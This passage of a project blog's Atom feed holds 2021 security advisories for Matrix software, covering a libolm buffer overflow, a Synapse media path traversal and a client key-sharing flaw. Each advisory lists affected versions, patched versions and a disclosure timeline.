		<updated>2021-12-13T16:11:07+00:00</updated>
		<link rel="alternate" href="/blog/2021/12/13/disclosure-buffer-overflow-in-libolm-and-matrix-js-sdk/" type="text/html"/>
		<id>/blog/2021/12/13/disclosure-buffer-overflow-in-libolm-and-matrix-js-sdk/</id>
		<content type="html">&lt;p&gt;Today we are releasing security updates to libolm, matrix-js-sdk, and several clients including Element Web &#x2F; Desktop. Users are encouraged to upgrade as soon as possible. This resolves the &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;12&#x2F;03&#x2F;pre-disclosure-upcoming-security-release-of-libolm-and-matrix-js-sdk&quot;&gt;pre-disclosure&lt;&#x2F;a&gt; issued on December 3rd.&lt;&#x2F;p&gt;
&lt;p&gt;Fixed library versions are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;libolm: &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&#x2F;-&#x2F;tree&#x2F;3.2.8&quot;&gt;3.2.8&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;matrix-js-sdk: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;releases&#x2F;tag&#x2F;v15.2.1&quot;&gt;15.2.1&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Client versions incorporating the fixes are:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Element Web &#x2F; Desktop: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;element-web&#x2F;releases&#x2F;tag&#x2F;v1.9.7&quot;&gt;1.9.7&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;SchildiChat Web &#x2F; Desktop: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;SchildiChat&#x2F;schildichat-desktop&#x2F;releases&#x2F;tag&#x2F;v1.9.7-sc.1&quot;&gt;1.9.7-sc.1&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Cinny: &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ajbura&#x2F;cinny&#x2F;releases&#x2F;tag&#x2F;v1.6.0&quot;&gt;1.6.0&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;These releases mitigate a buffer overflow in &lt;code&gt;olm_session_describe&lt;&#x2F;code&gt;, a libolm debugging function used by matrix-js-sdk in its end-to-end encryption (E2EE) implementation. If you rely on matrix-js-sdk for E2EE, you are affected. This vulnerability has been assigned &lt;a href=&quot;https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2021-44538&quot;&gt;CVE-2021-44538&lt;&#x2F;a&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Clients which do &lt;em&gt;not&lt;&#x2F;em&gt; use matrix-js-sdk for E2EE, like FluffyChat or Element Android &#x2F; iOS, are &lt;em&gt;not&lt;&#x2F;em&gt; affected.&lt;&#x2F;p&gt;
&lt;p&gt;This issue has been present since the introduction of the &lt;code&gt;olm_session_describe&lt;&#x2F;code&gt; function in October 2019 (commits: &lt;a href=&quot;https:&#x2F;&#x2F;gitlab.matrix.org&#x2F;matrix-org&#x2F;olm&#x2F;-&#x2F;commit&#x2F;39a1ee0b18f0fced6d7bc293cc9a46ea70ec9e96&quot;&gt;libolm&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&#x2F;commit&#x2F;e6699c5424a856a639baa6d6f78d44594baaf404&quot;&gt;matrix-js-sdk&lt;&#x2F;a&gt;).&lt;&#x2F;p&gt;
&lt;p&gt;We do not believe it is practical to successfully exploit this issue. However, upgrading remains important as the overflow &lt;em&gt;can&lt;&#x2F;em&gt; be triggered remotely.&lt;&#x2F;p&gt;
&lt;p&gt;Separately from the above vulnerability, we noticed during an internal audit that the libolm bindings in matrix-js-sdk were not zeroing out certain arrays containing entropy for cryptographic operations. This causes the entropy to remain resident in memory longer than necessary. As a defense-in-depth measure, this release of libolm now proactively overwrites those arrays when it is safe to do so.&lt;&#x2F;p&gt;
&lt;p&gt;Lastly, we are also taking this opportunity to update the version of Electron bundled with Element Desktop, pulling in the latest backported security fixes there.&lt;&#x2F;p&gt;
&lt;p&gt;The buffer overflow was found and reported by GitHub user &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;brevilo&quot;&gt;@brevilo&lt;&#x2F;a&gt; in the course of developing &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;brevilo&#x2F;jolm&#x2F;&quot;&gt;jOlm&lt;&#x2F;a&gt;, a library of Java bindings to libolm; thank you. If you believe you&#x27;ve discovered a security vulnerability in Matrix or its implementations, please see our &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;security-disclosure-policy&#x2F;&quot;&gt;Security Disclosure Policy&lt;&#x2F;a&gt; for how to get in touch.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Pre-disclosure: upcoming security release of libolm and matrix-js-sdk</title>
		<published>2021-12-03T00:00:00+00:00</published>
		<updated>2021-12-03T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2021/12/03/pre-disclosure-upcoming-security-release-of-libolm-and-matrix-js-sdk/" type="text/html"/>
		<id>/blog/2021/12/03/pre-disclosure-upcoming-security-release-of-libolm-and-matrix-js-sdk/</id>
		<content type="html">&lt;p&gt;On &lt;strong&gt;Monday, 13th December&lt;&#x2F;strong&gt; we plan to publish a security release of libolm at 15:00 UTC to address a single high severity issue. To the best of our knowledge, only matrix-js-sdk and clients relying on it for E2EE are affected by this issue. This includes Element Web&#x2F;Desktop and their forks (like SchildiChat). The release of libolm will be immediately followed by a security release of matrix-js-sdk and the affected clients. Users of these clients are encouraged to &lt;strong&gt;upgrade as soon as the patched versions are released&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;We will be reaching out to downstream packagers to ensure they can prepare patched versions of the affected packages at the time of the release. The details of the vulnerability will be disclosed in a blog post on the day of the release. There is so far no evidence of the vulnerability being exploited in the wild.&lt;&#x2F;p&gt;
&lt;p&gt;The patched version numbers will be as follows:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;libolm 3.2.8&lt;&#x2F;li&gt;
&lt;li&gt;matrix-js-sdk 15.2.1&lt;&#x2F;li&gt;
&lt;li&gt;Element Web&#x2F;Desktop 1.9.7&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Thank you for your patience while we work to resolve this issue.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;Edit, 2021-12-13: Added patched release numbers.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Synapse 1.47.1 released</title>
		<published>2021-11-23T12:46:48+00:00</published>
		<updated>2021-11-23T12:46:48+00:00</updated>
		<link rel="alternate" href="/blog/2021/11/23/synapse-1-47-1-released/" type="text/html"/>
		<id>/blog/2021/11/23/synapse-1-47-1-released/</id>
		<content type="html">&lt;p&gt;Today we are releasing Synapse 1.47.1, a security update based on last week&#x27;s release of &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;11&#x2F;17&#x2F;synapse-1-47-0-released&quot;&gt;Synapse 1.47.0&lt;&#x2F;a&gt;. This &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;releases&#x2F;tag&#x2F;v1.47.1&quot;&gt;release&lt;&#x2F;a&gt; patches one high severity issue affecting Synapse installations 1.47.0 and earlier using the media repository. An attacker could cause these Synapses to download a remote file and store it in a directory outside the media repository. &lt;&#x2F;p&gt;
&lt;p&gt;Note that:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;This only affects homeservers using Synapse&#x27;s built-in media repository, as opposed to &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse-s3-storage-provider&quot;&gt;synapse-s3-storage-provider&lt;&#x2F;a&gt; or &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;turt2live&#x2F;matrix-media-repo&quot;&gt;matrix-media-repo&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;Attackers cannot control the exact name or destination of the stored file.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;To quote from the advisory:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;h3 id=&quot;ghsa-3hfw-x7gx-437c-cve-2021-41281-path-traversal-when-downloading-remote-media&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;security&#x2F;advisories&#x2F;GHSA-3hfw-x7gx-437c&quot;&gt;GHSA-3hfw-x7gx-437c&lt;&#x2F;a&gt; &#x2F; CVE-2021-41281: Path traversal when downloading remote media.&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;impact&quot;&gt;Impact&lt;&#x2F;h4&gt;
&lt;p&gt;Synapse instances with the media repository enabled can be tricked into downloading a file from a remote server into an arbitrary directory, potentially outside the media store directory.&lt;&#x2F;p&gt;
&lt;p&gt;The last two directories and file name of the path are chosen randomly by Synapse and cannot be controlled by an attacker, which limits the impact.&lt;&#x2F;p&gt;
&lt;p&gt;Homeservers with the media repository disabled are unaffected. Homeservers configured with a federation whitelist are also unaffected.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;The &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;synapse&#x2F;security&#x2F;advisories&#x2F;GHSA-3hfw-x7gx-437c&quot;&gt;advisory&lt;&#x2F;a&gt; has full details, including workarounds.&lt;&#x2F;p&gt;
&lt;p&gt;This issue was discovered and fixed by our internal security team.&lt;&#x2F;p&gt;
&lt;p&gt;Please update at your earliest convenience.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Pre-disclosure: upcoming security release of Synapse 1.47.1</title>
		<published>2021-11-18T00:00:00+00:00</published>
		<updated>2021-11-18T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2021/11/18/pre-disclosure-upcoming-security-release-of-synapse-1-47-1/" type="text/html"/>
		<id>/blog/2021/11/18/pre-disclosure-upcoming-security-release-of-synapse-1-47-1/</id>
		<content type="html">&lt;p&gt;On &lt;strong&gt;Tuesday, 23rd November&lt;&#x2F;strong&gt; we plan to release Synapse 1.47.1 at 12:00 UTC to address a single high severity issue. This vulnerability was discovered internally by our security team. Synapse is a Matrix homeserver implementation developed by the matrix.org team and the wider Matrix community.&lt;&#x2F;p&gt;
&lt;p&gt;If you&#x27;re a server administrator running Synapse, &lt;strong&gt;please be prepared to upgrade as soon as the patched version is released&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;We will be reaching out to downstream packagers to ensure they can prepare patched versions of affected packages at the time of the release. The details of the vulnerability will be disclosed in a blog post on the day of the release. There is so far no evidence of the vulnerability being exploited in the wild.&lt;&#x2F;p&gt;
&lt;p&gt;Thank you for your patience while we work to resolve this issue.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;Edit, 2021-11-19: The opening paragraph was amended to note that the vulnerability was discovered internally.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;em&gt;Edit, 2021-11-22: The opening paragraph was amended to include a release time of 12:00 UTC.&lt;&#x2F;em&gt;&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Disclosing CVE-2021-40823 and CVE-2021-40824: E2EE vulnerability in multiple Matrix clients</title>
		<published>2021-09-13T17:29:59+00:00</published>
		<updated>2021-09-13T17:29:59+00:00</updated>
		<link rel="alternate" href="/blog/2021/09/13/vulnerability-disclosure-key-sharing/" type="text/html"/>
		<id>/blog/2021/09/13/vulnerability-disclosure-key-sharing/</id>
		<content type="html">&lt;p&gt;Today we are disclosing a critical security issue affecting multiple Matrix clients and libraries including &lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;&quot;&gt;Element&lt;&#x2F;a&gt; (Web&#x2F;Desktop&#x2F;Android), &lt;a href=&quot;https:&#x2F;&#x2F;fluffychat.im&#x2F;&quot;&gt;FluffyChat&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;nheko-reborn.github.io&#x2F;&quot;&gt;Nheko&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;cinny.in&#x2F;&quot;&gt;Cinny&lt;&#x2F;a&gt;, and &lt;a href=&quot;https:&#x2F;&#x2F;schildi.chat&#x2F;&quot;&gt;SchildiChat&lt;&#x2F;a&gt;. Element on iOS is not affected.&lt;&#x2F;p&gt;
&lt;p&gt;Specifically, in certain circumstances it may be possible to trick vulnerable clients into disclosing encryption keys for messages previously sent by that client to user accounts later compromised by an attacker.&lt;&#x2F;p&gt;
&lt;p&gt;Exploiting this vulnerability to read encrypted messages requires gaining control over the recipient’s account. This requires either compromising their credentials directly or compromising their homeserver.&lt;&#x2F;p&gt;
&lt;p&gt;Thus, the greatest risk is to users who are in encrypted rooms containing malicious servers. Admins of malicious servers could attempt to impersonate their users&#x27; devices in order to spy on messages sent by vulnerable clients in that room.&lt;&#x2F;p&gt;
&lt;p&gt;This is not a vulnerability in the Matrix or Olm&#x2F;Megolm protocols, nor the libolm implementation. It is an implementation bug in certain Matrix clients and SDKs which support end-to-end encryption (“E2EE”).&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;We have no evidence of the vulnerability being exploited in the wild&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;This issue was discovered during an internal audit by Denis Kasak, a security researcher at Element.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;remediation-and-detection&quot;&gt;Remediation and Detection&lt;&#x2F;h2&gt;
&lt;p&gt;Patched versions of affected clients are available now; please upgrade as soon as possible — we apologise sincerely for the inconvenience. If you are unable to upgrade, consider keeping vulnerable clients offline until you can. If vulnerable clients are offline, they cannot be tricked into disclosing keys. They may safely return online once updated.&lt;&#x2F;p&gt;
&lt;p&gt;Unfortunately, it is difficult or impossible to retroactively identify instances of this attack with standard logging levels present on both clients and servers. However, as the attack requires account compromise, homeserver administrators may wish to review their authentication logs for any indications of inappropriate access.&lt;&#x2F;p&gt;
&lt;p&gt;Similarly, users should review the list of devices connected to their account with an eye toward missing, untrusted, or non-functioning devices. Because an attacker must impersonate an existing or historical device, exploiting this vulnerability would either break an existing login on the user’s account, or a historical device would be re-added and flagged as untrusted.&lt;&#x2F;p&gt;
&lt;p&gt;Lastly, if you have previously verified the users &#x2F; devices in a room, you would witness the safety shield on the room turn red during the attack, indicating the presence of an untrusted and potentially malicious device.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;affected-software&quot;&gt;Affected Software&lt;&#x2F;h2&gt;
&lt;p&gt;Given the severity of this issue, Element attempted to review all known encryption-capable Matrix clients and libraries so that patches could be prepared prior to public disclosure.&lt;&#x2F;p&gt;
&lt;p&gt;Known &lt;strong&gt;vulnerable&lt;&#x2F;strong&gt; software:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-js-sdk&quot;&gt;matrix-js-sdk&lt;&#x2F;a&gt; &amp;lt; 12.4.1&lt;&#x2F;strong&gt; (&lt;a href=&quot;https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2021-40823&quot;&gt;CVE-2021-40823&lt;&#x2F;a&gt;), including:
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;&quot;&gt;Element&lt;&#x2F;a&gt; Web &#x2F; Desktop &amp;lt; 1.8.3&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;schildi.chat&#x2F;&quot;&gt;SchildiChat&lt;&#x2F;a&gt; (Web &#x2F; Desktop) ≤ 1.7.32-sc1&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;cinny.in&#x2F;&quot;&gt;Cinny&lt;&#x2F;a&gt; &amp;lt; 1.2.1&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk2&quot;&gt;matrix-android-sdk2&lt;&#x2F;a&gt; &amp;lt; 1.2.2&lt;&#x2F;strong&gt; (&lt;a href=&quot;https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name=CVE-2021-40824&quot;&gt;CVE-2021-40824&lt;&#x2F;a&gt;), including:
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;element.io&#x2F;&quot;&gt;Element&lt;&#x2F;a&gt; (Android) &amp;lt; 1.2.2&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;schildi.chat&#x2F;&quot;&gt;SchildiChat&lt;&#x2F;a&gt; (Android) &amp;lt; 1.2.2.sc43&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-rust-sdk&quot;&gt;matrix-rust-sdk&lt;&#x2F;a&gt; &amp;lt; 0.4.0:&lt;&#x2F;strong&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;gitlab.gnome.org&#x2F;GNOME&#x2F;fractal&#x2F;-&#x2F;tree&#x2F;fractal-next&quot;&gt;fractal-next&lt;&#x2F;a&gt; is &lt;strong&gt;not vulnerable&lt;&#x2F;strong&gt; due to depending on a recent enough commit.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;poljar&#x2F;weechat-matrix-rs&#x2F;&quot;&gt;weechat-matrix-rs&lt;&#x2F;a&gt;, a rewrite of the original weechat-matrix script, had no tagged releases, but some commits did depend on vulnerable versions of the matrix-rust-sdk. Users should ensure to update to the latest master of weechat-matrix-rs, presently &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;poljar&#x2F;weechat-matrix-rs&#x2F;commit&#x2F;2b093a7ff1c75650467d61335b90e4a6ce1fa210&quot;&gt;2b093a7&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;gitlab.com&#x2F;famedly&#x2F;company&#x2F;frontend&#x2F;famedlysdk&quot;&gt;FamedlySDK&lt;&#x2F;a&gt; &amp;lt; 0.5.0&lt;&#x2F;strong&gt;, including:
&lt;ul&gt;
&lt;li&gt;Famedly &amp;lt; 0.45.0&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;fluffychat.im&#x2F;&quot;&gt;FluffyChat&lt;&#x2F;a&gt; &amp;lt; 0.40.0&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;nheko-reborn.github.io&#x2F;&quot;&gt;Nheko&lt;&#x2F;a&gt; ≤ 0.8.2&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We believe the following software is &lt;strong&gt;not vulnerable:&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-android-sdk&quot;&gt;matrix-android-sdk&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt; (deprecated!)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;matrix-ios-sdk&quot;&gt;matrix-ios-sdk&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;poljar&#x2F;matrix-nio&quot;&gt;matrix-nio&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;, including its use in&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;pantalaimon&quot;&gt; Pantalaimon&lt;&#x2F;a&gt; and &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;poljar&#x2F;weechat-matrix&quot;&gt;weechat-matrix&lt;&#x2F;a&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;We believe the following are &lt;strong&gt;not vulnerable&lt;&#x2F;strong&gt; due to not implementing key sharing:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;source.puri.sm&#x2F;Librem5&#x2F;chatty&#x2F;-&#x2F;tree&#x2F;master&#x2F;src&#x2F;matrix&quot;&gt;Chatty&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;vector-im&#x2F;hydrogen-web&#x2F;tree&#x2F;master&#x2F;src&#x2F;matrix&quot;&gt;Hydrogen&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;mautrix&#x2F;go&quot;&gt;mautrix&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;matrix-org&#x2F;purple-matrix&quot;&gt;purple-matrix&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;syphon-org&#x2F;syphon&quot;&gt;Syphon&lt;&#x2F;a&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;background&quot;&gt;Background&lt;&#x2F;h2&gt;
&lt;p&gt;Matrix supports the concept of “key sharing”, letting a Matrix client which lacks the keys to decrypt a message request those keys from that user&#x27;s other devices or the original sender&#x27;s device.&lt;&#x2F;p&gt;
&lt;p&gt;This was a feature added in 2016 in order to address edge cases where a newly logged-in device might not have the necessary keys to decrypt historical messages.  Specifically, if other devices in the room are unaware of the new device due to a network partition, they have no way to encrypt for it—meaning that the only way the new device will be able to decrypt history is if the recipient&#x27;s other devices share the necessary keys with it.&lt;&#x2F;p&gt;
&lt;p&gt;Other situations where key sharing is desirable include when the recipient hasn&#x27;t backed up their keys (either online or offline) and needs them to decrypt history on a new login, or when facing implementation bugs which prevent clients from sending keys correctly. Requesting keys from a user&#x27;s other devices sidesteps these issues.&lt;&#x2F;p&gt;
&lt;p&gt;Key sharing is described &lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;docs&#x2F;guides&#x2F;end-to-end-encryption-implementation-guide#key-sharing&quot;&gt;here&lt;&#x2F;a&gt; in the Matrix E2EE Implementation Guide, which contains the following paragraph:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;In order to securely implement key sharing, clients must not reply to every key request they receive. The recommended strategy is to share the keys automatically only to verified devices of the same user. &lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;This is the approach taken in the original implementation in matrix-js-sdk, as used in Element Web and others, with the extension of also letting the sending device service keyshare requests from recipient devices.  Unfortunately, the implementation did not sufficiently verify the identity of the device requesting the keyshare, meaning that a compromised account can impersonate the device requesting the keys, creating this vulnerability.&lt;&#x2F;p&gt;
&lt;p&gt;This is not a protocol or specification bug, but an implementation bug which was then unfortunately replicated in other independent implementations.&lt;&#x2F;p&gt;
&lt;p&gt;While we believe we have identified and contacted all affected E2EE client implementations: if your client implements key sharing requests, we strongly recommend you check that you cryptographically verify the identity of the device which originated the key sharing request.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;next-steps&quot;&gt;Next Steps&lt;&#x2F;h2&gt;
&lt;p&gt;The fact that this vulnerability was independently introduced so many times is a clear signal that the current wording in the Matrix Spec and the E2EE Implementation Guide is insufficient. We will thoroughly review the related documentation and revise it with clear guidelines on safely implementing key sharing.&lt;&#x2F;p&gt;
&lt;p&gt;Going further, we will also consider whether key sharing is still a necessary part of the Matrix protocol. If it is not, we will remove it. As discussed above, key sharing was originally introduced to make E2EE more reliable while we were ironing out its many edge cases and failure modes. Meanwhile, implementations have become much more robust, to the point that we may be able to go without key sharing completely. We will also consider changing how we present situations in which you cannot decrypt messages because the original sender was not aware of your presence. For example, undecryptable messages could be filed in a separate conversation thread, or those messages could require that keys are shared manually, effectively turning a bug into a feature.&lt;&#x2F;p&gt;
&lt;p&gt;We will also accelerate our work on matrix-rust-sdk as a portable reference implementation of the Matrix protocol, avoiding the implicit requirement that each independent library must necessarily reimplement this logic on its own. This will have the effect of reducing attack surface and simplifying audits for software which chooses to use matrix-rust-sdk.&lt;&#x2F;p&gt;
&lt;p&gt;Finally, we apologise to the wider Matrix community for the inconvenience and disruption of this issue.  While Element discovered this vulnerability during an internal audit of E2EE implementations, we will be funding an independent end-to-end audit of the reference Matrix E2EE implementations (not just Olm + libolm) in the near future to help mitigate the risk from any future vulnerabilities. The results of this audit will be made publicly available.&lt;&#x2F;p&gt;
&lt;h2 id=&quot;timeline&quot;&gt;Timeline&lt;&#x2F;h2&gt;
&lt;p&gt;Ultimately, Element took two weeks from initial discovery to completing an audit of all known, public E2EE implementations. It took a further week to coordinate disclosure, culminating in today&#x27;s announcement.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Monday, 23rd August — Discovery that Element Web is exploitable.&lt;&#x2F;li&gt;
&lt;li&gt;Thursday, 26th August — Determination that Element Android is exploitable with a modified attack.&lt;&#x2F;li&gt;
&lt;li&gt;Wednesday, 1 September — Determination that Element iOS fails safe in the presence of device changes.&lt;&#x2F;li&gt;
&lt;li&gt;Friday, 3 September — Determination that FluffyChat and Nheko are exploitable.&lt;&#x2F;li&gt;
&lt;li&gt;Tuesday, 7th September — Audit of Matrix clients and libraries complete.&lt;&#x2F;li&gt;
&lt;li&gt;Wednesday, 8th September — Affected software authors contacted, disclosure timelines agreed.&lt;&#x2F;li&gt;
&lt;li&gt;Friday, 10th September —&lt;a href=&quot;https:&#x2F;&#x2F;matrix.org&#x2F;blog&#x2F;2021&#x2F;09&#x2F;10&#x2F;pre-disclosure-upcoming-critical-fix-for-several-popular-matrix-clients&quot;&gt; Public pre-disclosure notification&lt;&#x2F;a&gt;. Downstream packagers (e.g., Linux distributions) notified via Matrix and e-mail.&lt;&#x2F;li&gt;
&lt;li&gt;Monday, 13th September — Coordinated releases of all affected software, public disclosure.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Pre-disclosure: upcoming critical fix for several popular Matrix clients</title>
		<published>2021-09-10T16:43:49+00:00</published>
		<updated>2021-09-10T16:43:49+00:00</updated>
		<link rel="alternate" href="/blog/2021/09/10/pre-disclosure-upcoming-critical-fix-for-several-popular-matrix-clients/" type="text/html"/>
		<id>/blog/2021/09/10/pre-disclosure-upcoming-critical-fix-for-several-popular-matrix-clients/</id>
		<content type="html">&lt;p&gt;Hi all,&lt;&#x2F;p&gt;
&lt;p&gt;A critical security vulnerability impacting several popular Matrix clients and libraries was recently discovered. A coordinated security release of the affected components will be happening in the afternoon (from an UTC perspective) of &lt;strong&gt;Monday, Sept 13th&lt;&#x2F;strong&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;We will be reaching out to downstream packagers to ensure they can prepare patched versions of affected packages at the time of the release. The details of the vulnerability will be disclosed in a blog post on the day of the release. There is so far no evidence of the vulnerability being exploited in the wild.&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;Please be prepared to upgrade as soon as the patched versions are released.&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Thank you for your patience while we work to resolve this issue.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>Synapse 1.41.1 released</title>
		<published>2021-08-31T00:00:00+00:00</published>
		<updated>2021-08-31T00:00:00+00:00</updated>
		<link rel="alternate" href="/blog/2021/08/31/synapse-1-41-1-released/" type="text/html"/>
		<id>/blog/2021/08/31/synapse-1-41-1-released/</id>
